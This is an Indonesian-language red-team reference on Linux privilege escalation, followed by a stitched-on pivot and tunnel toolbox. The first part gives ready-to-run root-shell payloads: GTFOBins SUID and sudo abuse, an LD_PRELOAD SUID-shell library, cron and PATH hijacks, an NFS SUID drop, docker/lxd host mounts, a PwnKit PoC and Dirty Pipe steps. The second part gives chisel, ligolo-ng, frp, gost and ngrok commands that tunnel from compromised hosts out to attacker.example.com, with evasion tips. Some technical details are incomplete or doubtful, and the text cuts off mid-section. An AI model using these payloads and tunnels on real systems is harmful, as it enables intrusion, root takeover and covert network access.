# Linux Privilege Escalation — Referensi Red Team

## 1. Enumerasi Baseline

### 1.1 linpeas (PEASS-ng, rilis 2024+)

Diperlukan: akses shell unprivileged, curl/wget atau upload.

```bash
# Kirim via HTTP
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -o /tmp/lp.sh
chmod +x /tmp/lp.sh
./lp.sh -a 2>&1 | tee /tmp/lp.out
```

Muncul: SUID/SGID anomali, capability `cap_*`, cron writable, sudo `-l`, NFS exports, grup (docker/lxd/disk), kernel version, writable PATH dirs, `/etc/passwd` writable, kredensial di env/history/`.git`.

Gagal bila: AV/EDR memblokir, `noexec` pada `/tmp`, hilang curl/wget + tidak bisa upload, shell rpm/restricted.

### 1.2 pspy (pspy64, rilis 1.2.0)

```bash
./pspy64 -pf -i 1000 2>&1 | tee /tmp/pspy.out
```

Memantau proses/cron tiap 1s tanpa root. Muncul: cron root menjalankan script di path writable, `/bin/sh -c` dari systemd timer, backup jobs dengan argumen yang bisa di-inject.

---

## 2. SUID / SGID Abuse (GTFOBins)

### 2.1 Enumerasi

```bash
find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null
# Bandingkan ke baseline GTFOBins; cek juga interpreter yg SUID
```

### 2.2 Payload keluarga GTFOBins

| Binary SUID | Perintah (root shell) | Syarat |
|---|---|---|
| `nmap` (≤5.20 w/ `--interactive`) | `nmap --interactive` → `!sh` | SUID + versi lama |
| `vim` / `vi` | `vim -c ':!/bin/sh'` | SUID |
| `find` | `find . -exec /bin/sh -p \; -quit` | `-p` mempertahankan EUID |
| `bash` | `/bin/bash -p` | SUID + bukan setuid-ignored |
| `less` / `more` | `less /etc/passwd` → `!sh` | SUID |
| `cp` | `cp /bin/sh /tmp/x; chmod +s /tmp/x; /tmp/x -p` | ≥ SUID |
| `env` | `env /bin/sh -p` | SUID |
| `awk` | `awk 'BEGIN{system("/bin/sh")}'` | SUID |
| `perl` | `perl -e 'exec "/bin/sh";'` | SUID + `-p` EUID utuh |
| `tar` | `tar cf /dev/null /etc/shadow --checkpoint=1 --checkpoint-action=exec=/bin/sh` | SUID |
| `python3` | `python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'` | SUID |
| `mount` | `mount -o bind /bin/sh /bin/mount; mount` | SUID mount cepat gagal; lihat catatan |
| `pkexec` | lihat §9 PwnKit | SUID + versi rentan |
| `sudo` | `sudo -l` | SUID + cek sudoers |

Konfirmasi EUID: `id` bila shell turunan tetap root — gunakan `-p` (`bash -p`, `sh -p`) untuk mencegah bash drop privilege.

### 2.3 Kenapa gagal di lapangan
- Kernel ≥ 3.14 dengan `nosuid` mount (`/tmp`, `/home` via autofs).
- Binary SUID modern (bash ≥ 4.3?) sudah men-drop privilege: `/bin/bash` SUID tidak memberi shell root tanpa `-p`.
- Hardening: `fs.protected_suid_dumpable`, SELinux `nosuid`, atau AppArmor profile yang membatasi exec.

---

## 3. Linux Capabilities

### 3.1 Enumerasi

```bash
getcap -r / 2>/dev/null
# Alternatif
find / -type f -exec getcap {} \; 2>/dev/null
```

### 3.2 Payload capability

| Binary | Cap | Payload |
|---|---|---|
| `python3` | `cap_setuid+ep` | `python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'` |
| `perl` | `cap_setuid+ep` | `perl -e 'use POSIX; setuid(0); exec "/bin/sh";'` |
| `tar` | `cap_dac_read_search+ep` | `tar -cvf /tmp/shadow.tar /etc/shadow` (baca shadow) |
| `openssl` / `gdb` | `cap_dac_read_search+ep` | baca `/etc/shadow` |
| `cap_net_raw+ep` di `ping`/`tcpdump` | — | sniffer / ARP-spoof |
| `cap_net_admin+ep` di `nmap`/`tcpdump` | — | raw socket / veth |

### 3.3 Kenapa gagal
- `ep` vs `p`: `cap_setuid+p` tanpa `e` tidak berlaku untuk exec normal (perlu `capsh --inh` atau filecap ruang user-ns).
- File system `nosuid` tidak menonaktifkan capability (terpisah). Namun `nosuid` + `--` pada beberapa distro ikut mengabaikan `security.capability` saat `noexec`.
- Container runtime modern (Docker 25+, containerd) drop semua cap dari set default — SUID dari image tetap jalan tapi cap hilang.

---

## 4. sudo Misconfiguration

### 4.1 Enumerasi

```bash
sudo -n -l                 # tanpa password
sudo -l                    # butuh password user
ls -la /etc/sudoers.d/     # bila bisa dibaca
cat /etc/sudoers 2>/dev/null
```

### 4.2 `NOPASSWD` untuk binary GTFOBins

Format sudo yang salah umum:

```
user ALL=(ALL) NOPASSWD: /usr/bin/vim
user ALL=(ALL) NOPASSWD: /usr/bin/python3 /opt/app.py
user ALL=(root) NOPASSWD: /usr/bin/systemctl
```

| Entry | Escalation |
|---|---|
| `vim` | `sudo vim -c ':!/bin/sh'` |
| `less`/`more` | `sudo less /etc/shadow` → `!sh` |
| `find` | `sudo find / -exec /bin/sh \; -quit` |
| `tar` | `sudo tar cf /dev/null x --checkpoint=1 --checkpoint-action=exec=/bin/sh` |
| `env` | `sudo env /bin/sh` |
| `awk` | `sudo awk 'BEGIN{system("/bin/sh")}'` |
| `systemctl` | `sudo systemctl edit x` menulis unit; atau `sudo systemctl status x` → `!sh` bila pager |
| `docker`/`podman` | lihat §8 |
| `apt`/`apt-get` | `sudo apt update -o APT::Update::Pre-Invoke::=/bin/sh` |
| `zip`/`unzip` | `sudo zip /tmp/x /etc/hosts -T --unzip-command="sh -c /bin/sh"` |
| `journalctl` | `sudo journalctl` → `!sh` bila pager tidak aman |

### 4.3 `sudoedit`

Celah klasik: `sudoedit` dieksekusi sebagaimana user dengan `EDITOR` milik **user** — bukan root. Bila `sudoers` berisi:

```
user ALL=(ALL) NOPASSWD: sudoedit /etc/nginx/nginx.conf
```

Bukan langsung shell. Tetapi bila pattern-nya wildcard dan target writable lewat symlink, atau bila `sudoedit` (versi < 1.8.31) mengizinkan path traversal `../../../` di argumen file, baca/tulis file root.

Payload symlink:

```bash
ln -s /etc/shadow /tmp/evil
sudo sudoedit /tmp/evil      # hanya bila target di sudoers mencakup /tmp/evil
```

### 4.4 `env_keep` + `LD_PRELOAD`

Sudoers:

```
Defaults env_keep += "LD_PRELOAD"
```

Atau di `/etc/ld.so.preload`. Payload:

```c
/* /tmp/x.c */
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
__attribute__((constructor)) void init(void){
    setuid(0); setgid(0);
    system("cp /bin/sh /tmp/rootshell; chmod 4755 /tmp/rootshell");
}
```

```bash
gcc -shared -fPIC -o /tmp/x.so /tmp/x.c
sudo LD_PRELOAD=/tmp/x.so /bin/true
/tmp/rootshell -p
```

Cek juga `env_keep` lain: `LD_AUDIT`, `LD_LIBRARY_PATH`, `PYTHONPATH`, `PERL5OPT`, `RUBYOPT`, `GEM_HOME`, `NODE_OPTIONS`.

### 4.5 Kenapa sudo gagal
- `secure_path` mengabaikan `PATH` user → PATH hijack gugur.
- `env_reset` (default) menghapus `LD_PRELOAD`, `LD_LIBRARY_PATH` → §4.4 tidak jalan meski `env_keep` tidak dikonfigurasi secara eksplisit.
- `sudo` ≥ 1.9.x dengan `sudoedit_checkdir` (default on sejak 1.8.15) memblokir symlink traversal.
- `requiretty` / `use_pty` memutus eksfil via pager interaktif.

---

## 5. Cron & systemd Timer Writable

### 5.1 Cron

```bash
ls -la /etc/cron.* /var/spool/cron /var/spool/cron/crontabs 2>/dev/null
cat /etc/crontab /etc/cron.d/* 2>/dev/null
crontab -l 2>/dev/null
# Watchdog: pspy64 -pf
```

Pola eksploitasi:

| Skenario | Payload |
|---|---|
| Script root di path writable | `echo 'cp /bin/sh /tmp/r; chmod 4755 /tmp/r' >> /opt/backup.sh` |
| Directory writable, script dihapus | `cp /bin/sh /opt/backup.sh; chmod +x /opt/backup.sh` (tunggu cron) |
| Path wildcard `tar *` di `/etc/cron.d` | tar wildcard injection (lihat §2.2) |
| `CRON` script tanpa shebang absolute | PATH crontab minimal `/usr/bin:/bin` — sulit di-hijack |

Skala waktu: cron default tiap menit; script `run-parts` di `/etc/cron.hourly` bisa telat hingga 1 jam.

### 5.2 systemd timer

```bash
systemctl list-timers --all
systemctl cat <timer>.timer <timer>.service
ls -la /etc/systemd/system/*.timer /lib/systemd/system/*.timer
```

Cek `ExecStart=` menunjuk script/path writable, atau environment file `EnvironmentFile=` writable:

```bash
# bila /etc/sysconfig/foo writable
echo 'ExecStart=/bin/sh -c "cp /bin/sh /tmp/r; chmod 4755 /tmp/r"' > /etc/sysconfig/foo
# tunggu timer; atau, bila unit writable:
systemctl restart suspicious.timer
```

### 5.3 Kenapa gagal
- `root` cron memakai `PATH=/usr/bin:/bin` dan `SHELL=/bin/sh` — hijack PATH user tidak berpengaruh.
- `cron` di Debian/Ubuntu punya `pam_env`, environment kustom dibersihkan.
- Anacron vs cron: `/etc/cron.daily` via anacron berjalan sekali sehari — window sempit.

---

## 6. PATH Hijack

### 6.1 Prasyarat & Enum

```bash
echo $PATH
find / -type d -writable 2>/dev/null
# Cari script root yang memanggil binary non-absolut
grep -rE 'system\(|popen\(|exec' /opt /usr/local 2>/dev/null | head
pspy64 -pf | grep -E 'sh -c|systemctl'
```

### 6.2 Payload

```bash
mkdir -p /tmp/x && cd /tmp/x
cat > gzip <<'EOF'
#!/bin/sh
cp /bin/sh /tmp/r && chmod 4755 /tmp/r
EOF
chmod +x gzip
export PATH=/tmp/x:$PATH
# tunggu script root yang memanggil `gzip`/`tar`/`python` tanpa path absolut
```

Untuk sudo dengan `secure_path`: `sudo PATH=/tmp/x:$PATH cmd` tidak jalan — `secure_path` override. Namun bila script root memanggil `backup.sh` via relative `./backup`, dan cwd script writable, hijack script.

### 6.3 Kenapa gagal
- `secure_path` (sudo), `ENV_PATH` (cron/systemd) menetapkan PATH absolut → hijack user tidak berlaku.
- Binary dipanggil absolut (`/usr/bin/gzip`) di source script.
- `fs.protected_symlinks=1` + symlink attack konsekuensi.

---

## 7. NFS `no_root_squash`

### 7.1 Enum target

```bash
showmount -e <target>
# atau dari shell target
cat /etc/exports
grep -E 'nfs|nfs4' /proc/mounts
```

Response `showmount`:

```
Export list for target:
/opt    *
/srv    *(rw,no_root_squash)
```

`no_root_squash` berarti UID 0 klien = UID 0 server.

### 7.2 Exploit — SUID drop

Dari host attacker (root lokal):

```bash
mkdir -p /tmp/nfs && mount -t nfs -o vers=3 <target>:/srv /tmp/nfs
cat > /tmp/nfs/x.c <<'EOF'
#include <unistd.h>
int main(void){ setuid(0); setgid(0); execl("/bin/sh","sh",NULL); }
EOF
gcc -o /tmp/nfs/x /tmp/nfs/x.c && chmod 4755 /tmp/nfs/x
umount /tmp/nfs
```

Di target:

```bash
/srv/x        # root shell, karena suid dimiliki root DAN binary di NFS no_root_squash
```

### 7.3 Varian lain
- `/home` NFS no_root_squash → tulis `.ssh/authorized_keys` untuk root (jika home root di NFS).
- `/etc` NFS no_root_squash → tulis `/etc/ld.so.preload`.
- Kerberos NFS (`sec=krb5`) memblokir klaim UID 0 — teknik gugur kecuali credential NFS root ada.

### 7.4 Kenapa gagal
- Export `root_squash` (default) → UID 0 klien dipetakan ke `nobody`.
- `all_squash` + `anonuid` → semua UID flatten.
- Firewall: `rpcbind`/`nfsd` hanya 111/2049 internal.
- NFSv4 via `sec=sys` masih bisa; `sec=krb5p` tidak.

---

## 8. docker / lxd Group

### 8.1 Docker group

```bash
id
docker ps 2>/dev/null && echo DOCKER_GROUP_OK
```

Payload mount host:

```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
# spesifik: drop SUID di host
docker run -v /:/mnt --rm -it alpine \
  sh -c 'cp /bin/sh /mnt/tmp/r; chmod 4755 /mnt/tmp/r'
```

Variasi tanpa internet:

```bash
docker run -v /:/mnt --rm -it --entrypoint /bin/sh <image_yang_ada>
```

Bila docker socket (`/var/run/docker.sock`) di-mount ke container yang sudah di shell — identik: `curl --unix-socket /var/run/docker.sock http://localhost/containers/json`.

### 8.2 lxd group

```bash
id | grep -o '\blxd\b' && lxc list
```

Payload:

```bash
# image alpine mini (harus tersedia/lokal, lxd tidak bisa pull tanpa network)
lxc init alpine privesc -c security.privileged=true
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
lxc start privesc
lxc exec privesc /bin/sh
# di dalam: cp /bin/sh /mnt/root/tmp/r; chmod 4755 /mnt/root/tmp/r; exit
```

Alternatif `security.privileged=false` dengan idmap `root` — lxd ≥ 3.x masih ok selama daemon tidak di-hardening.

### 8.3 Kenapa gagal
- Docker 25+/27+ dengan `userns-remap` → `--privileged` tetap, tapi bind-mount host `/` tetap bisa menulis karena mount namespace? **Tidak**: `userns-remap` memetakan UID 0 container ke UID host bukan-root, sehingga `chmod 4755` di `/tmp` host menjadi milik UID acak — SUID tidak jadi root host. Deteksi: `docker info | grep -i userns` atau `cat /etc/docker/daemon.json`.
- Docker ≥ 20.10 dengan `no-new-privileges` default pada sebagian distro.
- lxd ≥ 5.0 dengan `security.privileged=true` diblokir bila `/etc/subuid` belum disiapkan (image tidak dapat idmap) atau profil `default` memaksa `security.nesting=false`.
- AppArmor/SELinux label `container_t` mencegah write ke `host-root`.

---

## 9. Kernel CVE — Ringkasan Operasional

| CVE | Nama | Kernel terpengaruh | Payload minimal | Prasyarat |
|---|---|---|---|---|
| CVE-2022-0847 | Dirty Pipe | 5.8 – 5.16.11 (fix di 5.16.11/5.15.25/5.10.102) | Tulis `/etc/passwd` atau overwrite SUID `/usr/bin/sudo` byte | unprivileged user; `splice()` tidak butuh cap |
| CVE-2021-4034 | PwnKit (pkexec) | polkit 0.105–0.120 (Ubuntu 20.04, Debian 11, RHEL 8 default) | `pkexec` argc=0 → getenv argv overflow | binary `pkexec` SUID ada; tidak perlu kernel spesifik |
| CVE-2024-1086 | nf_tables UAF | Linux ≤ 6.6.14, distro patch lambat (Ubuntu 22.04 < 5.15.0-100) | `nft` user namespace + ruleset, trigger double-free → ROP | `unprivileged_userns_clone=1` atau `kernel.unprivileged_userns_clone=1` |
| CVE-2023-32233 | nf_tables UAF (batch) | 6.3.1 ≤ kernel < 6.3.5; distro 5.15/6.1 belum patch | nft batch replace, lalu unshare user-netns | userns enabled |
| CVE-2024-21626 | runc (Leaky Vessels) | runc ≤ 1.1.11 | `docker run --rm -w /proc/self/fd/7` | akses docker/podman |
| CVE-2023-0386 | OverlayFS UAF | Ubuntu ≤ 22.04 (5.15.0-69?), RHEL 8 | FUSE + overlay, drop SUID di file lower | userns + FUSE |

### 9.1 Dirty Pipe (contoh konkret)

Dari PoC publik `blasty-vs-dirtypipe`:

```bash
git clone https://github.com/.../CVE-2022-0847-dirty-pipe-poc
gcc -o dp dp.c
./dp /usr/bin/su /tmp/su.bak

# atau overwrite /etc/passwd: suntik root tanpa password
# root:$(openssl passwd -1 -salt x pwn):0:0:root:/root:/bin/bash
./dp /etc/passwd /tmp/passwd.bak
su root   # password: pwn
```

**Kenapa gagal**: kernel ≥ 5.16.11, atau `CONFIG_` patch distro meski banner kernel tampak lama (backport). Verifikasi: `uname -r` **saja tidak cukup** — cek `/boot/config-$(uname -r)` atau uji PoC benign (buka file read-only dengan `splice()` + `write` → `EPERM`).

### 9.2 PwnKit

```bash
# PoC: argv kosong -> pkexec baca env sebagai argv[0]
mkdir -p /tmp/pk && cd /tmp/pk
cat > pwn.c <<'EOF'
#include <unistd.h>
int main(int c, char**v){ char *a[]={"pkexec","--help",NULL}; char *e[]={"PATH=GCONV_PATH=.", "CHARSET=PWNKIT", "SHELL=/bin/sh", "GIO_USE_VFS=local", NULL}; execve("/usr/bin/pkexec", a, e); }
EOF
gcc -o pwn pwn.c && ./pwn
```

Pada Ubuntu 20.04.3 / 21.04 / 21.10 / Debian 11 default, `pkexec` SUID + polkit rentan → root shell tanpa password. Fixed: polkit 0.120-1ubuntu2 (CVE-2021-4034).

**Kenapa gagal**: polkit dipatch, atau `pkexec` tidak SUID (RedHat/CentOS sudah — pkexec SUID tapi polkit 0.120 → **tetap rentan**; cek `rpm -q polkit`), atau `pkexec` dihapus.

### 9.3 nf_tables CVE-2024-1086

Payload: `CVE-2024-1086` PoC (Notselwyn) — butuh user namespace (unprivileged):

```bash
sysctl kernel.unprivileged_userns_clone   # 1 = aktif, 0 = userns off
cat /proc/sys/kernel/unprivileged_userns_clone
```

Bila `0`, teknik gugur di Debian/Ubuntu (default Ubuntu 24.04 masih 1; Debian 12 masih 1; RHEL 8/9 = 0).

**Kenapa gagal**: `kernel.unprivileged_userns_clone=0`, `user.max_user_namespaces=0`, AppArmor profile pada `unshare` (Ubuntu 24.04 `unprivileged_userns` restrict).

---

## 10. Jebakan Operasional Lapangan (ringkas)

| Jebakan | Dampak | Mitigasi |
|---|---|---|
| `uname -r` tidak mencerminkan backport distro | Dirty Pipe / nf_tables PoC crash atau EPERM | Uji patch distro via `apt changelog` / `rpm -q --changelog` / cek `/proc/version_signature` (Ubuntu) |
| `unprivileged_userns_clone=0` + AppArmor restrict | Semua kernel-namespace exploit (1086, 32233, 0386) mati | Cek `/proc/sys/user/max_user_namespaces`; pakai jalur non-userns |
| `userns-remap` Docker/LXD | §8 payload `chmod 4755` menghasilkan SUID milik UID non-root host | Baca `docker info`, `lxc profile show default` |
| `secure_path` + `env_reset` di sudo | PATH hijack & `LD_PRELOAD` mati | Cek `sudo -l` untuk `env_keep` eksplisit; jangan harap default |
| NFS `root_squash` default | §7 suid drop tidak menjadi root server | `showmount -e`; cek `/etc/exports` bila ada |
| `pkexec` sudah dihapus / polkit patched | PwnKit gagal walau kernel tua | Cek versi paket, bukan kernel |
| Cron `PATH=/usr/bin:/bin` + script dipanggil absolut | §5/§6 mati | Fokus ke file **writable**, bukan path hijack |
| `pspy` tidak menangkap proses <1s | Cron bernama `wget -q -O- ... \| sh` luput | Turunkan interval `-i 100` atau `-f` (inotify-like pada /proc) |
| `noexec` pada `/tmp`/`/dev/shm` | Payload `.so` / script tidak exec | Fallback `/var/tmp`, `memfd_create`, exec via interpreter (`python3 /tmp/x.py`) |
| Kernel SAS (SELinux/AppArmor) | `docker run -v /:/mnt` menulis file tapi `chmod 4755` ditolak label | `getenforce` / `aa-status`; cari writable berlabel `container_file_t` yang di-mount ke host `unconfined_t` |
| Docker daemon `--userns-remap` aktif | SUID drop tidak esk ke root host | `docker info | grep -i userns`; alternatif tulis `authorized_keys` ke `/root` di mount (jalan bila root container UID 0 masih root host pada mount path tertentu — verifikasi) |
| `sudo` ≥ 1.9 dengan `sudoedit_checkdir` | Symlink `sudoedit` gagal | Cari juga `edit` wildcard & `sudo -e` ke direktori writable langsung |
| `cap_setuid+p` tanpa `+e` | `python3` cap SUID tidak esk | Verifikasi `getcap`; butuh `cap_setuid+ep` atau `cap_setuid+i` (inheritable) pada exec |
| `nosuid` mount + SUID file | `find -perm -4000` false positive, exec tidak esk | `mount | grep nosuid`; cek `findmnt -no OPTIONS <path>` |


## w2-pivot-tunnel

# w2-pivot-tunnel — linux

# Tunnel/Pivot Toolbox — Referensi Red Team

## 1. Matriks Keputusan Cepat

| Skenario | Tool | Arah | Protokol | Auth | Catatan |
|---|---|---|---|---|---|
| SOCKS internal dari host foothold | `ssh -D`, `chisel client`, `gost -L=socks5` | outbound-only | TCP/HTTP | lihat §2 | pilih ssh jika port 22 keluar terbuka; chisel jika hanya 80/443 |
| Port-forward satu service | `ssh -L`, `socat`, `chisel remote`, `ligolo-ng` | inbound ke kita | TCP | — | ligolo tanpa listener per-port |
| Reverse tunnel NAT traversal | `chisel reverse`, `ssh -R`, `frp client`, `ngrok tcp` | keluar dari target | TCP/HTTP/WS | token | butuh VPS publik |
| Full L3 pivot (routing subnet) | `ligolo-ng` (TUN) | agent→proxy | TLS/gRPC | self-signed cert | butuh CAP_NET_ADMIN di sisi attacker |
| Multiplex banyak port via satu 443 | `gost` chain, `chisel` multi-remote | outbound | TLS/WS | — | bypass egress filter |

Versi acuan: `chisel v1.10.1`, `ligolo-ng v0.7.2`, `gost v3.0.0`, `frp v0.61.0`, `ngrok v3.19`, `OpenSSH 9.6p1`, `socat 1.8.0.0`, `proxychains-ng 4.17`, `nmap 7.95`.

---

## 2. SOCKS Proxy Internal (dari host foothold)

### 2.1 SSH dynamic (`ssh -D`)

Attacker menjalankan di mesin sendiri, SSH ke host foothold (kredensial/key yang sudah didapat):

```bash
ssh -N -D 0.0.0.0:1080 \
    -o ExitOnForwardFailure=yes \
    -o ServerAliveInterval=30 \
    -o ServerAliveCountMax=3 \
    -i ./id_ed25519_foot op@10.0.5.12
```

- Yang dikirim: handshake SSH + channel `direct-tcpip` per koneksi SOCKS.
- Yang muncul di target: `/var/log/auth.log` `Accepted publickey for op`, `ss -tnp` menunjukkan koneksi keluar ke attacker:22.
- Berhasil jika: `curl --socks5-hostname 127.0.0.1:1080 http://10.10.0.5/` mengembalikan 200.
- Gagal jika: `-D` bind tanpa `-N` justru membuka shell; firewall egress blok 22; `AllowTcpForwarding no` di `sshd_config`.

Varian bind-address sempit (hanya localhost attacker):
```bash
ssh -N -D 127.0.0.1:1080 op@10.0.5.12
```

### 2.2 Chisel — client-side SOCKS (C2-port friendly)

Server di VPS attacker:

```bash
./chisel server \
  --port 443 \
  --reverse \
  --tls-domain cdn.example.com \
  --tls-key ./key.pem --tls-cert ./cert.pem \
  --auth redteam:Str0ngP@ss \
  --keepalive 25s
```

Client di foothold (Linux/macOS):

```bash
./chisel client \
  --auth redteam:Str0ngP@ss \
  --fingerprint <sha256-pin> \
  --keepalive 25s \
  https://cdn.example.com:443 \
  socks
```

Client Windows (PowerShell, executable amd64):

```powershell
.\chisel.exe client --auth redteam:Str0ngP@ss --fingerprint <sha256-pin> ^
  https://cdn.example.com:443 socks
```

- Hasil: SOCKS5 di `127.0.0.1:1080` **sisi server** (attacker). Client hanya outbound.
- Yang dikirim: HTTPS POST `/` + WebSocket upgrade, frame protobuf `socks` channel.
- Indikator sukses di server: `session#1(main): Listening for SOCKS5 connections`.
- Indikator gagal: `Handshake failed` (auth/fingerprint), `dial tcp: i/o timeout` (egress), `error: websocket: bad handshake` (proxy 302 ke captive portal).

Catatan: `--tls-domain` mengirim SNI khusus; `--fingerprint` wajib saat self-signed supaya tidak menolak cert. Pin didapat dari `openssl s_client -connect cdn.example.com:443 </dev/null 2>/dev/null | openssl x509 -fingerprint -sha256 -noout`.

### 2.3 gost v3 — SOCKS5 tunable

Server:

```bash
gost -L socks5://:1080?udp=true
```

Client-agent (reverse ke attacker lewat TLS, tetap outbound dari target):

```bash
gost -L rtcp://:0/:1080 -F relay+tls://user:pass@attacker.example.com:443
```

- Yang dikirim: TLS ke `:443`, protobuf relay.
- Sukses: `ss -lntp | grep 1080` di attacker; `proxychains curl` OK.
- Gagal: `relay: tls handshake failed` (SNI tak match cert), `socks5: auth required` (kredensial salah sisi client).

### 2.4 ssh -R sebagai reverse SOCKS

Dari **target**:

```bash
ssh -N -R 1080 -o ExitOnForwardFailure=yes \
    -o ServerAliveInterval=30 op@attacker.example.com
```

Di `attacker:/etc/ssh/sshd_config`:
```
GatewayPorts clientspecified
AllowTcpForwarding yes
```

Hasil SOCKS5 di `attacker:127.0.0.1:1080`. Untuk ekspos LAN attacker tambahkan `-R 0.0.0.0:1080` (butuh `GatewayPorts clientspecified`).

- Yang dikirim: channel `forwarded-tcpip` over SSH keluar.
- Gagal jika: `PermitOpen`/`PermitListen` membatasi; `Failed to allocate port`; `AllowTcpForwarding remote` belum diset.

## 3. Port-Forward Pivot (single-port exposure)

### 3.1 `ssh -L` (local forward)

```bash
ssh -N -L 127.0.0.1:8443:10.10.0.20:443 op@10.0.5.12 \
    -o ExitOnForwardFailure=yes -o ServerAliveInterval=30
```
Akses: `https://127.0.0.1:8443` → host `10.10.0.20:443` **via** `10.0.5.12`.

Indikator gagal:
- `bind [127.0.0.1]:8443: Address already in use` → ganti port.
- `channel 2: open failed: connect failed: Connection refused` → target internal unreachable dari foothold, atau egress blok.
- `administratively prohibited: open failed` → `PermitOpen` di `sshd` target.

### 3.2 `socat` (forwarder tanpa auth, hop-to-hop)

Di foothold:
```bash
socat TCP-LISTEN:8443,fork,reuseaddr TCP:10.10.0.20:443
```
Di attacker (jika foothold tak reachable, pasang reverse dulu):
```bash
socat TCP-LISTEN:8443,fork,reuseaddr TCP:10.0.5.12:8443
```

TLS-passthrough dual-hop:
```bash
socat TCP-LISTEN:8443,fork,reuseaddr OPENSSL:10.10.0.20:443,verify=0
```

- Yang dikirim: TCP murni (bit-for-bit).
- Gagal: `socat[pid] E connect(5, AF=2 10.10.0.20:443, 16): Connection refused`; `E bind(5, ..., 8443): Address already in use`; SELinux `avc: denied { name_bind }`.

### 3.3 Chisel remote port-forward

Server attacker sudah jalan (§2.2). Client di foothold:

```bash
./chisel client --auth redteam:Str0ngP@ss --fingerprint <pin> \
  https://cdn.example.com:443 \
  R:8443:10.10.0.20:443
```

Atau ekspos di semua interface attacker: `R:0.0.0.0:8443:10.10.0.20:443`.

- Sukses: di server `session#1(main): Listening for port-forward connections (R:8443)`.
- Gagal: `Error: unable to listen on port 8443: address already in use`, `dial tcp 10.10.0.20:443: i/o timeout`.

### 3.4 ligolo-ng — multi-port tanpa listener per-port

Attacker (proxy):
```bash
sudo ip tuntap add dev ligolo0 mode tun
sudo ip link set ligolo0 up
sudo ip addr add 240.0.0.1/32 dev ligolo0
sudo ./proxy -selfcert -laddr 0.0.0.0:11601
```

`-selfcert` membuat CA + leaf; sertifikat server yang dipakai agent diunduh via `-autocert` atau file. Mode `-selfcert` **tidak** memverifikasi agent; untuk verifikasi, pakai `-certfile`/`-keyfile` hasil `ligolo-ng` proxy `-selfcert` pertama.

Agent di foothold (Windows 11 24H2 x64):
```powershell
.\agent.exe -connect attacker.example.com:11601 -ignore-cert
```
Linux:
```bash
./agent -connect attacker.example.com:11601 -ignore-cert
```

Di konsol proxy:
```
session
[Agent : op@win11] » interface_create --name ligoloTun
[Agent : op@win11] » ifconfig
[Agent : op@win11] » start
```

Route di attacker ke subnet di balik foothold:
```bash
sudo ip route add 10.10.0.0/16 dev ligolo0
```

Akses langsung: `nmap -p- 10.10.0.20` dari memori attacker tanpa port-forward.

- Yang dikirim: TLS/gRPC + raw IP-in-frame. Agent hanya butuh outbound `:11601`.
- Sukses: banner `[Agent : ...] »`, `start` menampilkan stats; `ping 10.10.0.20` di attacker lewat TUN.
- Gagal: `Connection refused` (proxy mati/firewall VPS), `tls: bad certificate` (agent menghilangkan `-ignore-cert` setelah proxy pakai cert valid), `route add ... dev ligolo0: Network is unreachable` (lupa `ip link set up`), `cannot create tun: operation not permitted` (tanpa root / Windows tanpa admin).

### 3.5 frp — reverse port forward (target-outbound)

`frps.toml` di VPS attacker:
```toml
bindAddr = "0.0.0.0"
bindPort = 7000
auth.method = "token"
auth.token  = "MyS3cretT0k3n"
transport.tls.force = true
vhostHTTPSPort = 8443
allowPorts = [{ start = 10000, end = 20000 }]
```

`frpc.toml` di target:
```toml
serverAddr = "attacker.example.com"
serverPort = 7000
auth.method = "token"
auth.token  = "MyS3cretT0k3n"
transport.tls.enable = true
transport.tls.serverName = "attacker.example.com"
loginFailExit = false
log.level = "info"

[[proxies]]
name = "rdp-internal"
type = "tcp"
localIP = "10.10.0.20"
localPort = 3389
remotePort = 13389
```

Start di Windows 11 24H2 (service mode opsional):
```powershell
.\frpc.exe -c .\frpc.toml
# atau: .\frpc.exe install -c C:\ProgramData\frp\frpc.toml ; Start-Service frpc
```

- Yang dikirim: TLS ke `:7000`, kontrol `login` (protobuf), data channel tiap proxy.
- Sukses: `frps` log `[rdp-internal] start proxy success`, target `frpc` log `start proxy success`.
- Gagal: `authentication failed` (token), `port 13389 already used` (di server), `dial tcp 10.10.0.20:3389: connect: connection refused` di `frpc`.

### 3.6 ngrok — quick TCP reverse (paling noisy, cepat)

```yaml
version: "3"
agent:
  authtoken: <TOKEN>
tunnels:
  rdp:
    proto: tcp
    addr: 10.10.0.20:3389
    remote_addr: 1.tcp.ngrok.example:1024
```
Jalankan di target:
```bash
ngrok start --all --config ngrok.yml --log=stdout --log-format=json
```

- Yang dikirim: TLS ke `*.ngrok.com`, tunnel TCP over HTTPS/443.
- Sukses: log `available at tcp://x.tcp.ngrok.example:PORT`; `nc -vz` dari attacker OK.
- Gagal: `ERR_NGROK_108` (authtoken invalid), `ERR_NGROK_3200` (endpoint offline), DNS `*.ngrok.com` di-blackhole (umum di korp).

**Indikasi deteksi:** DNS query ke `*.ngrok.com`, `*.chisel.` domain, `:11601` di flow logs, JA3 TLS fingerprint khas.

## 4. Reverse Tunnel NAT Traversal — perbandingan

| Tool | Port keluar | Protokol | Sisi target | Sisi attacker |
|---|---|---|---|---|
| `ssh -R` | 22 (SSH) | SSH | `ssh -N -R …` | `GatewayPorts` di `sshd` |
| chisel reverse | 80/443 | HTTPS/WSS | `chisel client … R:…` | `chisel server --reverse` |
| frp | 7000 (TLS) | TCP/TLS | `frpc` | `frps` |
| ngrok | 443 | TCP over HTTPS | `ngrok start` | kontrol via API |
| gost reverse | 443/8443 | relay+TLS | `gost -L rtcp://… -F …` | `gost -L relay+tls://…` |
| ligolo-ng | 11601 | TLS/gRPC | `agent -connect` | `proxy -selfcert` |

Pemilihan cepat:
- Firewall egress hanya 443 → **chisel --tls** atau **frp transport.tls.force**.
- Butuh multiple port banyak → **ligolo-ng** atau **frp** dengan banyak `[[proxies]]`.
- Butuh paling stealth di Windows domain korp → **frpc** sebagai service (persist), atau **chisel** binary rename.
- Lab cepat (tanpa SLA) → **ngrok**.

## 5. Chain NMAP All-Port via Proxychains

### 5.1 Setup proxychains-ng v4.17

`/etc/proxychains4.conf`:
```
strict_chain
proxy_dns
remote_dns_subnet 224
tcp_read_time_out 15000
tcp_connect_time_out 8000
[ProxyList]
socks5  127.0.0.1  1080  redteam  Str0ngP@ss
```

Chain dua hop (SOCKS fiddler → SOCKS chisel):
